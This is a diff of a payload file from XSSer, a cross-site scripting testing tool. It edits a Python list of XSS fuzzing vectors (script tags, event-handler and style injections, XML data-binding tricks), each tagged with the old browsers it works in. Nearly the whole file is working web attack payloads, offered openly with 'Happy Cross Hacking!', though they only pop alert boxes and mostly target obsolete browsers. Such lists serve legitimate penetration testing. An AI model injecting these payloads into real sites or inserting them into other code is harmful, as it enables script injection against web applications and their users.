@@ -23,7 +23,6 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 #
 ## This file contains different XSS fuzzing vectors to inject in payloads and browser supports.
 ## If you have some new vectors, please email me to [root@lordepsylon.net] and i will add your list to XSSer framework.
-## After, all people who wants to update the tool only will need to do: (python XSser.py --update)
 ## Thats all.
 ###
 ## Happy Cross Hacking! ;)
@@ -33,7 +32,7 @@ vectors = [
 		{ 'payload':"""<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS");>""",
 		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
 
-		{ 'payload':""""><img src=x onerror=alert(XSS);>""",
+		{ 'payload':""""><img src="x:x" onerror="alert(XSS)">""",
 		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},		
 	
 		{ 'payload':"""'';!--"<XSS>=&{()}" """,
@@ -167,9 +166,9 @@ vectors = [
 
    		{ 'payload':"""<DIV STYLE="width: expression(alert('XSS'));">""",
 		  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},
-		
-		{ 'payload':"""<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>""",
-		  'browser':"""[IE6.0|NS8.1-IE]"""},
+	       	
+		#{ 'payload':"""<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>""",
+		#  'browser':"""[IE6.0|NS8.1-IE]"""},
 	
 		{ 'payload':"""<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">""",
   		  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""}, 
@@ -207,8 +206,8 @@ vectors = [
 		{ 'payload':"""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>""",
 		  'browser':"""[IE6.0|NS8.1-IE]"""},
 		#60#
-		{ 'payload':"""<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>""",
-  		  'browser':"""[IE6.0|NS8.1-IE]"""}, 
+		#{ 'payload':"""<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>""",
+  		#  'browser':"""[IE6.0|NS8.1-IE]"""}, 
 
 		{ 'payload':"""<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>""",
 		  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},
@@ -219,7 +218,7 @@ vectors = [
 		{ 'payload':"""<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">""",
 		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},	 
 
-		{ 'payload':"""<SCRIPT SRC=http://127.0.0.1></SCRIPT>""", 
+		{ 'payload':"""<SCRIPT SRC=http://127.0.0.1>alert("XSS")</SCRIPT>""", 
 		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
 
 	        #{ 'payload':"""';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>""",
@@ -270,8 +269,8 @@ vectors = [
 		{ 'payload':"""<a href="javascript#alert('XSS');">""",
 		  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
 
-		{ 'payload':"""<div onmouseover="alert('XSS');">""",
-		  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
+		#{ 'payload':"""<div onmouseover="alert('XSS');">""",
+		#  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
 
 		{ 'payload':"""<input type="image" dynsrc="javascript:alert('XSS');">""",
 		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
@@ -303,11 +302,11 @@ vectors = [
 		{ 'payload':"""<!-- -- --><script>alert('XSS');</script><!-- -- -->""",
 		  'browser':"""[Not Info]"""},
 
-		{ 'payload':"""<img src="blah"onmouseover="alert('XSS');">""",
-		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
+		#{ 'payload':"""<img src="blah"onmouseover="alert('XSS');">""",
+		#  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
 
-		{ 'payload':"""<img src="blah>"onmouseover="alert('XSS');">""",
-		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
+		#{ 'payload':"""<img src="blah>"onmouseover="alert('XSS');">""",
+		#  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
 		
 		{ 'payload':"""<xml id="X"><a><b><script>alert('XSS');</script>;<b></a></xml>""",
 		  'browser':"""[IE6.0|NS8.1-IE]"""},
@@ -320,5 +319,8 @@ vectors = [
 
 		{ 'payload':"""<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:alert('XSS');">]]</C><X></xml>""",
 		  'browser':"""[IE6.0|NS8.1-IE]"""},
+
+		{ 'payload':"""</TITLE><SCRIPT>alert("XSS");</SCRIPT>""",
+		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""}
 
 ]
